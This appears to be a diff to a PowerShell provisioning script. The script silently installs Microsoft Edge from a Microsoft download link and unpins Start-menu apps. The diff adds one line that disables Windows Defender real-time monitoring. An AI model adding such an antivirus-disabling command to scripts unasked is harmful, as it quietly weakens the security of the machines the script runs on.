@@ -9,6 +9,8 @@ $Download = join-path $env:temp\edgeinstall MicrosoftEdgeEnterpriseX64.msi
 Invoke-WebRequest 'http://go.microsoft.com/fwlink/?LinkID=2093437'  -OutFile $Download
 Start-Process "$Download" -ArgumentList "/quiet"
 
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 Write-Host "Unpinning apps from start menu"
 # Unpin apps from start menu
 function Pin-App {    param(
